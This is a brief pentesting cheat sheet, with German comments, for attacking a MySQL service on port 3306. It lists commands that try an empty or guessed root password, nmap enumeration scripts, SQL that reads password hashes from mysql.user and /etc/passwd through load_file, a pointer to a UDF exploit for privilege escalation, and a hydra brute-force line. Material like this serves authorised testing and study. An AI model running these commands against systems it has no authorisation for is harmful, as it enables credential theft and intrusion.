# 🐬 MySQL (3306)

## Connect

```bash
mysql -h $RHOST -u root            # leeres root-PW?
mysql -h $RHOST -u root -p
mysql -h $RHOST -u root -p'password' -e "show databases;"
```

## Enumeration

```bash
nmap -p3306 --script "mysql-*" $RHOST
nmap -p3306 --script mysql-empty-password $RHOST
nmap -p3306 --script mysql-info,mysql-databases,mysql-users $RHOST
```

## Innerhalb MySQL

```sql
SHOW DATABASES;
USE dbname;
SHOW TABLES;
SELECT * FROM users;
SELECT user, password FROM mysql.user;
SELECT @@version, @@hostname, @@datadir;
SELECT load_file('/etc/passwd');                    -- LFI wenn FILE-Privileg
```

## RCE via UDF (wenn root)

```sql
-- Klassischer UDF-Exploit für Privilege Escalation auf dem Host
-- siehe: searchsploit "mysql udf"
```

## Bruteforce

```bash
hydra -L users.txt -P passwords.txt mysql://$RHOST
```
